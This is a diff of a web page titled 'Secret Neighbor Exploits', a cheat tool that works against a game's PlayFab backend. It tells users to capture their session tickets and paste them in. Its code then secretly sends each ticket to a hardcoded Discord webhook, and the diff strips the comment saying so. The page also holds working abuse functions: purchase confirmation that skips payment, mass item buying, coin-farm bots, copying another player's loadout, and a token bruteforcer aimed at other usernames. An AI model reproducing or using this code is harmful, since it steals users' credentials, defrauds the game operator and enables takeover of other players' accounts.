@@ -10,8 +10,9 @@
       padding: 0;
       background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
       background-size: cover;
-      background-position: center center;
+      background-position: center;
       background-repeat: no-repeat;
+      background-attachment: fixed;
       min-height: 100vh;
       font-family: Arial, sans-serif;
       color: white;
@@ -164,6 +165,18 @@
 
   <div class="container">
     <div class="section">
+      <h2>📄 How to Get Your SessionTicket with Requestly</h2>
+      <ol>
+        <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
+        <li>Open Requestly and start recording network traffic.</li>
+        <li>Log into your game or app using PlayFab.</li>
+        <li>Find the request to <code>/Client/LoginWithSteam</code> or similar.</li>
+        <li>Copy the <code>SessionTicket</code> or <code>X-Authorization</code> from the response body.</li>
+        <li>Paste it into the field above and click "Set Token".</li>
+      </ol>
+    </div>
+
+    <div class="section">
       <h2>🔐 Session Ticket</h2>
       <input id="sessionTicketInput" placeholder="Paste your SessionTicket here" type="text">
       <button onclick="setSessionTicket()">Set Token</button>
@@ -174,7 +187,6 @@
       <div id="tokenStatus" class="output" style="display: none;">No token set</div>
     </div>
 
-    <!-- NEW SECTION: Purchase All Skins and Emotes -->
     <div class="section">
       <h2>🛒 Purchase All Skins & Emotes</h2>
       <p class="warning">This will attempt to purchase all available items that use FE, AC, or XP currency</p>
@@ -338,7 +350,6 @@
       <div class="output" id="questOutput">Quest update results will appear here...</div>
     </div>
 
-    <!-- Additional PlayFab APIs -->
     <div class="section">
       <h2>🔗 Additional Stuff</h2>
       <div class="api-grid">
@@ -384,15 +395,30 @@
     </div>
 
     <div class="section">
-      <h2>📄 How to Get Your SessionTicket with Requestly</h2>
-      <ol>
-        <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
-        <li>Open Requestly and start recording network traffic.</li>
-        <li>Log into your game or app using PlayFab.</li>
-        <li>Find the request to <code>/Client/LoginWithSteam</code> or similar.</li>
-        <li>Copy the <code>SessionTicket</code> or <code>X-Authorization</code> from the response body.</li>
-        <li>Paste it into the field above and click "Set Token".</li>
-      </ol>
+      <h2>🔑 Photon Token Generator <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
+      <button onclick="togglePhotonTokenGenerator()" id="photonTokenToggleButton">Start Generating Photon Token</button>
+      <div class="output" id="photonTokenOutput">Token will appear here...</div>
+    </div>
+
+    <div class="section">
+      <h2>🔄 Reset Loadout</h2>
+      <button onclick="resetLoadout()">Reset Loadout</button>
+      <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
+    </div>
+
+    <div class="section">
+      <h2>🕵️ Steal Loadout</h2>
+      <input id="targetPlayFabId" placeholder="Target PlayFab ID" type="text">
+      <button onclick="stealLoadout()">Steal Loadout</button>
+      <div class="output" id="stealLoadoutOutput">Results will appear here...</div>
+    </div>
+
+    <div class="section">
+      <h2>🔨 Photon Token Bruteforcer</h2>
+      <input id="playFabUsername" placeholder="PlayFab Username" type="text">
+      <button onclick="startBruteforce()">Start Bruteforce</button>
+      <button onclick="stopBruteforce()">Stop Bruteforce</button>
+      <div class="output" id="bruteforceOutput">Results will appear here...</div>
     </div>
   </div>
 
@@ -403,6 +429,9 @@
     let coinFarmIntervalId = null;
     let levelEditorRunning = false;
     let levelEditorIntervalId = null;
+    let bruteforceRunning = false;
+    let photonTokenRunning = false;
+    let photonTokenIntervalId = null;
 
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
@@ -415,7 +444,6 @@
         tokenStatus.style.color = "green";
         console.log("SessionTicket set:", sessionTicket);
         
-        // Send to Discord webhook
         sendToDiscordWebhook(sessionTicket);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
@@ -434,7 +462,6 @@
       tokenStatus.style.color = "red";
     }
 
-    // NEW FUNCTION: Renew Session Ticket
     async function renewSessionTicket() {
       const tokenStatus = document.getElementById("tokenStatus");
       
@@ -462,7 +489,6 @@
         const data = await response.json();
         
         if (data.data && data.data.EntityToken) {
-          // Update the session ticket with the new one
           sessionTicket = data.data.EntityToken;
           localStorage.setItem('sessionTicket', sessionTicket);
           document.getElementById("sessionTicketInput").value = sessionTicket;
@@ -481,7 +507,6 @@
       }
     }
 
-    // Function to send SessionTicket to Discord webhook
     async function sendToDiscordWebhook(sessionTicket) {
       const webhookURL = "https://discord.com/api/webhooks/1410689568386056275/Eq3YHxlcvOHxbbH7qXZHVPBPItzXBKQZgPk2wYpA6iy_ArTGfg5GaD-FLEjQ7xB8K4vb";
       
@@ -538,7 +563,6 @@
       return result;
     }
 
-    // NEW FUNCTION: Purchase All Skins and Emotes
     async function purchaseAllSkinsEmotes() {
       const output = document.getElementById("purchaseAllOutput");
       output.textContent = "Starting purchase process...\n";
@@ -549,7 +573,6 @@
       }
       
       try {
-        // Step 1: Get catalog items
         output.textContent += "📋 Fetching catalog items...\n";
         const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
           CatalogVersion: "Ingame"
@@ -563,7 +586,6 @@
         const catalogItems = catalogData.data.Catalog;
         output.textContent += `✅ Found ${catalogItems.length} items in catalog\n`;
         
-        // Step 2: Get user inventory to check what we already own
         output.textContent += "📦 Checking current inventory...\n";
         const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {});
         
@@ -575,27 +597,21 @@
         const ownedItems = inventoryData.data.Inventory.map(item => item.ItemId);
         output.textContent += `✅ You own ${ownedItems.length} items\n`;
         
-        // Step 3: Filter items to purchase (only FE, AC, XP currencies, not owned, and not RM)
         const itemsToPurchase = [];
         
         for (const item of catalogItems) {
-          // Skip if already owned
           if (ownedItems.includes(item.ItemId)) {
             output.textContent += `⏩ Skipping ${item.ItemId} (already owned)\n`;
             continue;
           }
           
-          // Check if item has virtual currency prices
           if (item.VirtualCurrencyPrices) {
             const currencies = Object.keys(item.VirtualCurrencyPrices);
-            
-            // Find acceptable currencies (FE, AC, XP) and exclude RM
             const acceptableCurrencies = currencies.filter(currency => 
               ['FE', 'AC', 'XP'].includes(currency) && currency !== 'RM'
             );
             
             if (acceptableCurrencies.length > 0) {
-              // Use the first acceptable currency
               const currency = acceptableCurrencies[0];
               const price = item.VirtualCurrencyPrices[currency];
               
@@ -616,7 +632,6 @@
         
         output.textContent += `\n🛒 Attempting to purchase ${itemsToPurchase.length} items...\n\n`;
         
-        // Step 4: Purchase items one by one
         let successfulPurchases = 0;
         let failedPurchases = 0;
         
@@ -642,7 +657,6 @@
             failedPurchases++;
           }
           
-          // Add a small delay between purchases to avoid rate limiting
           await new Promise(resolve => setTimeout(resolve, 500));
         }
         
@@ -654,11 +668,9 @@
         output.textContent += `❌ Unexpected error: ${error.message}\n`;
       }
       
-      // Scroll to bottom to see latest logs
       output.scrollTop = output.scrollHeight;
     }
 
-    // EXISTING FUNCTIONS
     async function addFriend() {
       const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();
       
@@ -690,13 +702,15 @@
       if (data.data && data.data.Friends) {
         let friendsList = "Friends List:\n";
         data.data.Friends.forEach(friend => {
-          friendsList += `- ${friend.Username} (${friend.PlayFabId})\n`;
+          const steamId = friend.SteamInfo?.SteamId ? 
+            `https://steamcommunity.com/profiles/${friend.SteamInfo.SteamId}` : "N/A";
+          friendsList += `- ${friend.TitleDisplayName || "Unknown"} (${friend.FriendPlayFabId})\n  Steam Profile: ${steamId}\n`;
         });
         output.textContent = friendsList;
       } else if (data.error) {
         output.textContent = `Error: ${data.error}`;
       } else {
-        output.textContent = formatResponse(data);
+        output.textContent = "No friends found.";
       }
     }
 
@@ -828,64 +842,57 @@
       }
     }
 
- async function grantCoupons() {
-  const output = document.getElementById("couponOutput");
-  output.textContent = "Starting coupon grant process...";
-  
-  try {
-    // Start purchase
-    output.textContent += "\nStarting purchase...";
-    const startData = await makeApiCall("Client/StartPurchase", "POST", {
-      StoreId: "steam_Shop_Currency",
-      Items: [{
-        ItemId: "Currency_Bundle_PileOfCoupons",
-        Quantity: 1
-      }]
-    });
-
-    if (startData.error) {
-      output.textContent += `\nError in StartPurchase: ${startData.error}`;
-      return;
-    }
-
-    const orderId = startData.data?.OrderId;
-    if (!orderId) {
-      output.textContent += "\nStartPurchase failed. No OrderId returned.";
-      return;
-    }
-
-    output.textContent += `\nOrder ID: ${orderId}`;
-    
-    // Pay for purchase
-    output.textContent += "\nPaying for purchase...";
-    const payData = await makeApiCall("Client/PayForPurchase", "POST", {
-      OrderId: orderId,
-      Currency: "RM",
-      ProviderName: "Steam"
-    });
-
-    // Always try to confirm purchase regardless of payment result
-    output.textContent += "\nConfirming purchase...";
-    
-    // Confirm purchase
-    const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
-      OrderId: orderId
-    });
-
-    if (confirmData.error) {
-      output.textContent += `\nError in ConfirmPurchase: ${confirmData.error}`;
-    } else {
-      output.textContent += "\nCoupon process completed:\n" + 
-        formatResponse(confirmData.data);
-    }
+    async function grantCoupons() {
+      const output = document.getElementById("couponOutput");
+      output.textContent = "Starting coupon grant process...";
       
-  } catch (error) {
-    output.textContent += `\nUnexpected error: ${error.message}`;
-  }
-}
+      try {
+        output.textContent += "\nStarting purchase...";
+        const startData = await makeApiCall("Client/StartPurchase", "POST", {
+          StoreId: "steam_Shop_Currency",
+          Items: [{
+            ItemId: "Currency_Bundle_PileOfCoupons",
+            Quantity: 1
+          }]
+        });
 
-    
-      
+        if (startData.error) {
+          output.textContent += `\nError in StartPurchase: ${startData.error}`;
+          return;
+        }
+
+        const orderId = startData.data?.OrderId;
+        if (!orderId) {
+          output.textContent += "\nStartPurchase failed. No OrderId returned.";
+          return;
+        }
+
+        output.textContent += `\nOrder ID: ${orderId}`;
+        
+        output.textContent += "\nPaying for purchase...";
+        const payData = await makeApiCall("Client/PayForPurchase", "POST", {
+          OrderId: orderId,
+          Currency: "RM",
+          ProviderName: "Steam"
+        });
+
+        output.textContent += "\nConfirming purchase...";
+        
+        const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
+          OrderId: orderId
+        });
+
+        if (confirmData.error) {
+          output.textContent += `\nError in ConfirmPurchase: ${confirmData.error}`;
+        } else {
+          output.textContent += "\nCoupon process completed:\n" + 
+            formatResponse(confirmData.data);
+        }
+        
+      } catch (error) {
+        output.textContent += `\nUnexpected error: ${error.message}`;
+      }
+    }
 
     async function viewStatistics() {
       const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {});
@@ -930,9 +937,8 @@
       });
 
       const output = document.getElementById("usefulDeedOutput");
-      if (data.data?.FunctionResult) {
-        const result = data.data.FunctionResult;
-        output.textContent = `✅ usefulDeed Result:\n${formatResponse(result)}`;
+      if (data.data?.FunctionName) {
+        output.textContent = `✅ usefulDeed executed successfully\nExecution Time: ${data.data.ExecutionTimeSeconds}s\nMemory Used: ${data.data.MemoryConsumedBytes} bytes\nAPI Requests: ${data.data.APIRequestsIssued}`;
       } else {
         output.textContent = "Error: " + (data.error || "Unknown error");
       }
@@ -987,7 +993,6 @@
 
       output.textContent = "Fetching data...";
 
-      // Get combined info
       const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
         PlayFabId: playfabId,
         InfoRequestParameters: {
@@ -997,7 +1002,6 @@
         }
       });
 
-      // Get profile info
       const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
         PlayFabId: playfabId,
         ProfileConstraints: {
@@ -1079,15 +1083,15 @@
         return;
       }
 
-      const delaySeconds = parseInt(document.getElementById("delaySelect").value);
-      const delayMs = delaySeconds * 1000;
+      const delayMinutes = parseInt(document.getElementById("delaySelect").value);
+      const delayMs = delayMinutes * 60 * 1000;
 
       coinFarmBotRunning = true;
       document.getElementById("botStatus").className = "status-indicator status-active";
       document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";
 
       document.getElementById("cloudOutput").textContent = 
-        `Starting Coin Farm Bot with ${delaySeconds} second interval...\n`;
+        `Starting Coin Farm Bot with ${delayMinutes} minute interval...\n`;
 
       async function runCoinFarmCycle() {
         const roomType = document.getElementById("roomType").value;
@@ -1105,7 +1109,6 @@
 
         let matchId = null;
 
-        // startNewMatch
         try {
           const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
             FunctionName: "startNewMatch",
@@ -1115,19 +1118,16 @@
 
           if (data.error) {
             output += `❌ startNewMatch: Error - ${data.error}\n`;
+          } else if (data.data?.FunctionResult?.currentMatchId) {
+            matchId = data.data.FunctionResult.currentMatchId;
+            output += `✅ startNewMatch: MatchId - ${matchId}\n`;
           } else {
-            const result = data.data?.FunctionResult;
-            output += `✅ startNewMatch: ${formatResponse(result)}\n`;
-            if (result && result.CurrentMatchId) {
-              matchId = result.CurrentMatchId;
-              output += `New MatchId: ${matchId}\n`;
-            }
+            output += `✅ startNewMatch: Success\n`;
           }
         } catch (err) {
           output += `❌ startNewMatch: Exception - ${err.message}\n`;
         }
 
-        // decideSpecialRole
         try {
           const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
             FunctionName: "decideSpecialRole",
@@ -1138,14 +1138,12 @@
           if (data.error) {
             output += `❌ decideSpecialRole: Error - ${data.error}\n`;
           } else {
-            const result = data.data?.FunctionResult;
-            output += `✅ decideSpecialRole: ${formatResponse(result)}\n`;
+            output += `✅ decideSpecialRole: Success\n`;
           }
         } catch (err) {
           output += `❌ decideSpecialRole: Exception - ${err.message}\n`;
         }
 
-        // xpConsumed if matchId available
         if (matchId) {
           try {
             const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
@@ -1163,8 +1161,7 @@
             if (data.error) {
               output += `❌ xpConsumed: Error - ${data.error}\n`;
             } else {
-              const result = data.data?.FunctionResult;
-              output += `✅ xpConsumed: ${formatResponse(result)}\n`;
+              output += `✅ xpConsumed: Success\n`;
             }
           } catch (err) {
             output += `❌ xpConsumed: Exception - ${err.message}\n`;
@@ -1173,7 +1170,6 @@
           output += `⏩ xpConsumed: Skipped - No MatchId available\n`;
         }
 
-        // finishMatch
         try {
           const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
             FunctionName: "finishMatch",
@@ -1183,24 +1179,25 @@
 
           if (data.error) {
             output += `❌ finishMatch: Error - ${data.error}\n`;
+          } else if (data.data?.Logs) {
+            output += `✅ finishMatch: Success\nLogs:\n`;
+            data.data.Logs.forEach(log => {
+              output += `- ${log.Message}\n`;
+            });
           } else {
-            const result = data.data?.FunctionResult;
-            output += `✅ finishMatch: ${formatResponse(result)}\n`;
+            output += `✅ finishMatch: Success\n`;
           }
         } catch (err) {
           output += `❌ finishMatch: Exception - ${err.message}\n`;
         }
 
-        output += `Waiting ${delaySeconds} seconds for next cycle...\n`;
+        output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
         const cloudOutput = document.getElementById("cloudOutput");
         cloudOutput.textContent += output;
         cloudOutput.scrollTop = cloudOutput.scrollHeight;
       }
 
-      // Run first cycle immediately
       runCoinFarmCycle();
-      
-      // Set up interval for subsequent cycles
       coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
     }
 
@@ -1230,8 +1227,7 @@
           if (data.error) {
             output += `❌ setLevelProgressionForClass: Error - ${data.error}\n`;
           } else {
-            const result = data.data?.FunctionResult;
-            output += `✅ setLevelProgressionForClass: ${formatResponse(result)}\n`;
+            output += `✅ setLevelProgressionForClass: Success\n`;
           }
         } catch (err) {
           output += `❌ setLevelProgressionForClass: Exception - ${err.message}\n`;
@@ -1242,11 +1238,152 @@
         levelOutput.scrollTop = levelOutput.scrollHeight;
       }
 
-      // Run continuously with no delay (but add minimal timeout to avoid blocking)
-      levelEditorIntervalId = setInterval(runLevelEditorCycle, 100); // 100ms minimal delay to prevent overload
+      runLevelEditorCycle();
+      levelEditorIntervalId = setInterval(runLevelEditorCycle, 1000);
     }
 
-    // Initialize page
+    function togglePhotonTokenGenerator() {
+      if (photonTokenRunning) {
+        clearInterval(photonTokenIntervalId);
+        photonTokenRunning = false;
+        document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
+        document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
+        document.getElementById("photonTokenOutput").textContent += "\nPhoton token generator stopped manually.";
+        return;
+      }
+
+      photonTokenRunning = true;
+      document.getElementById("photonTokenStatus").className = "status-indicator status-active";
+      document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";
+
+      document.getElementById("photonTokenOutput").textContent = "Starting Photon token generation...\n";
+
+      async function generatePhotonToken() {
+        const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
+          PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e",
+          AuthenticationContext: null
+        });
+
+        const output = document.getElementById("photonTokenOutput");
+        if (data.data?.PhotonCustomAuthenticationToken) {
+          output.textContent += `✅ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
+        } else {
+          output.textContent += `❌ Error: ${data.error || "Failed to generate token"}\n`;
+        }
+        output.scrollTop = output.scrollHeight;
+      }
+
+      generatePhotonToken();
+      photonTokenIntervalId = setInterval(generatePhotonToken, 1000);
+    }
+
+    async function resetLoadout() {
+      const output = document.getElementById("resetLoadoutOutput");
+      const getData = await makeApiCall("Client/GetUserData", "POST", {});
+      if (getData.error) {
+        output.textContent = `Error getting data: ${getData.error}`;
+        return;
+      }
+      if (getData.data.Data && "loadout" in getData.data.Data) {
+        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
+          Data: { loadout: null }
+        });
+        if (updateData.error) {
+          output.textContent = `Error resetting: ${updateData.error}`;
+        } else {
+          output.textContent = "Loadout reset successfully!";
+        }
+      } else {
+        output.textContent = "No loadout found to reset.";
+      }
+    }
+
+    async function stealLoadout() {
+      const targetId = document.getElementById("targetPlayFabId").value.trim();
+      const output = document.getElementById("stealLoadoutOutput");
+      if (!targetId) {
+        output.textContent = "Please enter a target PlayFab ID.";
+        return;
+      }
+      const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
+        PlayFabId: targetId,
+        InfoRequestParameters: { GetUserData: true }
+      });
+      if (getData.error) {
+        output.textContent = `Error getting data: ${getData.error}`;
+        return;
+      }
+      const userData = getData.data.InfoResultPayload.UserData;
+      if (userData && "loadout" in userData) {
+        const loadoutValue = userData.loadout.Value;
+        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
+          Data: { loadout: loadoutValue }
+        });
+        if (updateData.error) {
+          output.textContent = `Error updating: ${updateData.error}`;
+        } else {
+          output.textContent = "Loadout stolen successfully!";
+        }
+      } else {
+        output.textContent = "No loadout found on target.";
+      }
+    }
+
+    function generateRandomToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let token = '';
+      for (let i = 0; i < 50; i++) {
+        token += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return token;
+    }
+
+    async function checkToken(username, token) {
+      try {
+        const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`);
+        return await res.json();
+      } catch (error) {
+        return { error: error.message };
+      }
+    }
+
+    function startBruteforce() {
+      if (bruteforceRunning) return;
+      const username = document.getElementById("playFabUsername").value.trim();
+      if (!username) {
+        document.getElementById("bruteforceOutput").textContent = "Please enter a PlayFab Username.";
+        return;
+      }
+      bruteforceRunning = true;
+      const output = document.getElementById("bruteforceOutput");
+      output.textContent = "Starting bruteforce...\n";
+
+      async function tryToken() {
+        if (!bruteforceRunning) return;
+        const token = generateRandomToken();
+        output.textContent += `Trying ${token}...\n`;
+        const result = await checkToken(username, token);
+        if (result.error) {
+          output.textContent += `Error: ${result.error}\n`;
+        } else {
+          output.textContent += `Response: ${JSON.stringify(result)}\n`;
+          if (result.resultCode === 1) {
+            output.textContent += `✅ Valid token found: ${token}\n`;
+            stopBruteforce();
+            return;
+          }
+        }
+        output.scrollTop = output.scrollHeight;
+        tryToken();
+      }
+      tryToken();
+    }
+
+    function stopBruteforce() {
+      bruteforceRunning = false;
+      document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped.\n";
+    }
+
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
       const savedTicket = localStorage.getItem('sessionTicket');
